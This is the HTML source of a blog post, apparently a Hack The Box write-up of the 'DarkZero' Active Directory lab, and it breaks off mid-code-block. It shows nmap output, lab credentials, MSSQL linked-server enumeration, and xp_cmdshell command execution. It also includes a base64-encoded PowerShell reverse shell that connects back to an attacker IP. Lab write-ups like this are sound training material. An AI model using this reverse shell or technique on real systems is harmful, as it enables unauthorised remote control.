@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/04/07/hackthebox-darkzero/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewDarkZero is a hard-difficulty machine from Hack The Box that deals initially with MSSQL linked servers, allowing us to pivot through a linked SQL server on a secondary domain controller to ach">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: DarkZero">
+<meta property="og:url" content="http://fouedsaidi.com/2026/04/07/Hackthebox-DarkZero/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewDarkZero is a hard-difficulty machine from Hack The Box that deals initially with MSSQL linked servers, allowing us to pivot through a linked SQL server on a secondary domain controller to ach">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkZero/DarkZero.png">
+<meta property="article:published_time" content="2026-04-07T20:27:08.000Z">
+<meta property="article:modified_time" content="2026-04-07T20:41:42.580Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DarkZero/DarkZero.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: DarkZero -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: DarkZero</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-07 23:27:08</span>
+        <span class="mobile">2026-04-07 23:27:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-07 23:41:42</span>
+            <span class="mobile">2026-04-07 23:41:42</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>DarkZero is a hard-difficulty machine from Hack The Box that deals initially with MSSQL linked servers, allowing us to pivot through a linked SQL server on a secondary domain controller to achieve remote code execution. We’ll then escalate privileges using CVE-2024-30088 to get SYSTEM on the second DC, abuse unconstrained delegation to capture a TGT from DC01, and finally perform a DCSync attack against the parent domain to obtain the domain administrator’s NTLM hash.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/DarkZero/DarkZero.png"
+                      alt="DarkZero"
+                ><figcaption>DarkZero</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>As is common in real life pentests, we start with credentials for the following account: <code>john.w:RFulUtONCOL!</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 10:57:24Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.darkzero.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb</span><br><span class="line">| Not valid before: 2025-07-29T11:40:00</span><br><span class="line">|_Not valid after:  2026-07-29T11:40:00</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.darkzero.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb</span><br><span class="line">| Not valid before: 2025-07-29T11:40:00</span><br><span class="line">|_Not valid after:  2026-07-29T11:40:00</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.129.199.110:1433:</span><br><span class="line">|     Target_Name: darkzero</span><br><span class="line">|     NetBIOS_Domain_Name: darkzero</span><br><span class="line">|     NetBIOS_Computer_Name: DC01</span><br><span class="line">|     DNS_Domain_Name: darkzero.htb</span><br><span class="line">|     DNS_Computer_Name: DC01.darkzero.htb</span><br><span class="line">|     DNS_Tree_Name: darkzero.htb</span><br><span class="line">|_    Product_Version: 10.0.26100</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2025-10-08T09:26:12</span><br><span class="line">|_Not valid after:  2055-10-08T09:26:12</span><br><span class="line">|_ssl-date: 2025-10-08T10:59:08+00:00; +7h00m03s from scanner time.</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.129.199.110:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2022 RTM</span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2022</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">2179/tcp open  vmrdp?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.darkzero.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb</span><br><span class="line">| Not valid before: 2025-07-29T11:40:00</span><br><span class="line">|_Not valid after:  2026-07-29T11:40:00</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.darkzero.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.darkzero.htb</span><br><span class="line">| Not valid before: 2025-07-29T11:40:00</span><br><span class="line">|_Not valid after:  2026-07-29T11:40:00</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-10-08T10:58:25</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see this is a Windows domain controller <code>DC01.darkzero.htb</code> with a lot of the usual AD ports open. What stands out here is MSSQL on port <code>1433</code> running Microsoft SQL Server 2022. Since we already have credentials, let’s start there.</p>
+<h2 id="MSSQL-Linked-Servers"><a href="#MSSQL-Linked-Servers" class="headerlink" title="MSSQL - Linked Servers"></a>MSSQL - Linked Servers</h2><p>We can connect to the MSSQL instance using <code>impacket-mssqlclient</code> with Windows authentication:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-mssqlclient  &#x27;darkzero.htb/john.w:RFulUtONCOL!@10.129.199.110&#x27; -windows-auth</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (darkzero\john.w  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We land as a guest on the master database. One thing I always do in MSSQL engagements is check for linked servers. Enumerating links reveals a second SQL server on <code>DC02.darkzero.ext</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SQL (darkzero\john.w  guest@master)&gt; enum_links</span><br><span class="line">SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT</span><br><span class="line">-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------</span><br><span class="line">DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL</span><br><span class="line"></span><br><span class="line">DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL</span><br><span class="line"></span><br><span class="line">Linked Server       Local Login       Is Self Mapping   Remote Login</span><br><span class="line">-----------------   ---------------   ---------------   ------------</span><br><span class="line">DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc</span><br><span class="line"></span><br><span class="line">SQL (darkzero\john.w  guest@master)&gt; use_link &quot;DC02.darkzero.ext&quot;</span><br><span class="line">SQL &gt;&quot;DC02.darkzero.ext&quot; (dc01_sql_svc  dbo@master)&gt; execute xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">output</span><br><span class="line">--------------------</span><br><span class="line">darkzero-ext\svc_sql</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line"></span><br><span class="line">SQL &gt;&quot;DC02.darkzero.ext&quot; (dc01_sql_svc  dbo@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that our <code>john.w</code> account is mapped to <code>dc01_sql_svc</code> on the linked server and we land as <code>dbo</code> on the master database of <code>DC02.darkzero.ext</code>. Even better, <code>xp_cmdshell</code> is enabled and we can execute commands as <code>darkzero-ext\svc_sql</code>. Let’s get a proper reverse shell.</p>
+<h2 id="Foothold-Reverse-Shell-via-MSSQL-Link"><a href="#Foothold-Reverse-Shell-via-MSSQL-Link" class="headerlink" title="Foothold - Reverse Shell via MSSQL Link"></a>Foothold - Reverse Shell via MSSQL Link</h2><p>We execute a PowerShell reverse shell through the linked server:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL &gt;&quot;DC02.darkzero.ext&quot; (dc01_sql_svc  dbo@master)&gt; execute xp_cmdshell &#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We catch the shell and confirm we are running as <code>darkzero-ext\svc_sql</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 